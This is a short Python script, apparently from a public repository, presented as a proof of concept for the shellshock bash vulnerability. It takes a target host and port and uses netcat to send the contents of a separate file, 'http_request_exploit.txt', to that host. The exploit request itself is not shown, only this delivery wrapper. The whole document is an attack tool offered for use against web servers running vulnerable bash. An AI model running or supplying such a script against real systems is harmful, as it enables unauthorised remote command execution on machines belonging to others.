# Remote Bash Execution

# rbe.py
# Exploiting the shellshock vulnerability ( see https://github.com/Parasithe/RBE )

# /JesseEmond
# /Parasithe

import argparse
from subprocess import call

parser = argparse.ArgumentParser(description='Remote Base Execution - proof of concept of the shellshock vulnerability')
parser.add_argument('target', help='the target host to send requests to')
parser.add_argument('--port', '-p', dest='port', metavar='port', help='the port of the target host to send requests to', default=80, type=int)

args = parser.parse_args()

REQUEST_FILE = 'http_request_exploit.txt'

command = 'nc {0} {1}'.format(args.target, args.port)

call(command.split(), stdin=open(REQUEST_FILE, 'r'))
